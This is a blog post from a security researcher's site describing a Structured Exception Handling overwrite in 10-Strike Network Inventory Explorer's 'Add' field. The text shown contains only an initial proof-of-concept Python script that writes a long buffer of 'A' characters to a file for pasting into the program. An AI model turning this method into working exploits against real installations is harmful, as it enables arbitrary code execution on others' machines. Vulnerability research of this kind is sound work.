---
layout: post
title: 10-Strike Network Inventory Explorer 'Add' Structered Exception Handling Overwrite
date: 2020-03-24 14:31:00
categories: posts
comments: false
en: true
---

# Preamble
Today i was gathering around Exploit-DB, when i found [this](https://www.exploit-db.com/exploits/44838) exploit, so i thought of searching a vulnerability in such software.

# The Bug
10-Strike Network Inventory Explorer suffers from a Structered Exception Handling (SEH) overwrite when issuing a long command within the 'Add' parameter, meaning that arbitrary code may be executed within a crafted exploit.

Initial PoC script:

```term_session
import struct

buffer = "A" * 1000
f = open ("strike.txt", "w")
f.write(buffer)
f.close()
```

Once the exploit is executed with python, it is opened and copied to clipboard with Notepad++:

![](/assets/img/Findings1/0.png)
